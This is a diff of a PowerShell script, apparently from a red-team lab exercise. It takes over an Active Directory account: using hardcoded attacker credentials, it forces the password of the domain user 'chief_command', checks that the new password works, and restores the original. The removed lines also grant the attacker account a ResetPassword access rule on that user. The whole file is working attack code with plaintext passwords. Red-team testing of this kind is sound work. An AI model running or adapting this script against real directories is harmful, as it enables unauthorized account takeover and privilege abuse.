@@ -1,37 +1,51 @@
 param(
     [string]$TargetUser = 'chief_command',
-    [string]$NewPassword = 'RedStrike_T015!',
     [string]$DomainRoot = 'cadre.local',
     [string]$AttackUser = 'hunter_dfir',
     [string]$AttackPassword = 'DF1R_Hunt3r!',
-    [string]$Dc = 'dc01.cadre.local'
+    [string]$Dc = 'dc01.cadre.local',
+    [string]$NewPwd = 'RedStrike_T015!',
+    [string]$OrigPwd = 'C0mm@nd_Ch1ef!'
 )
-
 $ErrorActionPreference = 'Stop'
 
 $cred = New-Object System.Management.Automation.PSCredential("$DomainRoot\$AttackUser", (ConvertTo-SecureString $AttackPassword -AsPlainText -Force))
 $netCred = $cred.GetNetworkCredential()
-
 $targetDn = "CN=$TargetUser,OU=Command,DC=cadre,DC=local"
+
+# Attempt Set-DomainUserPassword via DirectoryEntry
 $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/$targetDn", $netCred.UserName, $netCred.Password)
 $entry.RefreshCache()
+Write-Output "BOUND as $($netCred.UserName)"
 
-$identity = New-Object System.Security.Principal.NTAccount("$DomainRoot\$AttackUser")
-$sid = $identity.Translate([System.Security.Principal.SecurityIdentifier])
-$sidBinary = New-Object byte[] ($sid.BinaryLength)
-$sid.GetBinaryForm($sidBinary, 0)
+try {
+  # Use the extended-right to change the target user's password
+  $newEntry = $entry
+  $newEntry.Invoke("SetPassword", @($NewPwd))
+  $newEntry.CommitChanges()
+  Write-Output "T015_OK: password changed to temporary"
+} catch {
+  Write-Output "SETPASSWORD_ERR: $($_.Exception.Message)"
+}
 
-$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-    $sid,
-    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
-    [System.Security.AccessControl.AccessControlType]::Allow,
-    [Guid]"00299570-246d-11d0-a768-00aa006e0529"
-)
+# Verify: try authenticating as chief_command with the new password
+Write-Output "--- Verify new password ---"
+try {
+  $vCred = New-Object System.Management.Automation.PSCredential("$DomainRoot\$TargetUser", (ConvertTo-SecureString $NewPwd -AsPlainText -Force))
+  $vNet = $vCred.GetNetworkCredential()
+  $vEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/DC=cadre,DC=local", $vNet.UserName, $vNet.Password)
+  $vEntry.RefreshCache()
+  Write-Output "VERIFY_OK: new password works"
+} catch {
+  Write-Output "VERIFY_ERR: $($_.Exception.Message)"
+}
 
-$entry.ObjectSecurity.AddAccessRule($ace)
-$entry.CommitChanges()
-Write-Output "ACL_OK: granted ResetPassword on $TargetUser to $DomainRoot\$AttackUser"
-
-$entry2 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/$targetDn", $netCred.UserName, $netCred.Password)
-$entry2.Invoke("SetPassword", $NewPassword)
-Write-Output "PWD_OK: reset $TargetUser password"
+# Restore original password
+Write-Output "--- Restore original password ---"
+try {
+  $entry.Invoke("SetPassword", @($OrigPwd))
+  $entry.CommitChanges()
+  Write-Output "RESTORE_OK"
+} catch {
+  Write-Output "RESTORE_ERR: $($_.Exception.Message)"
+}
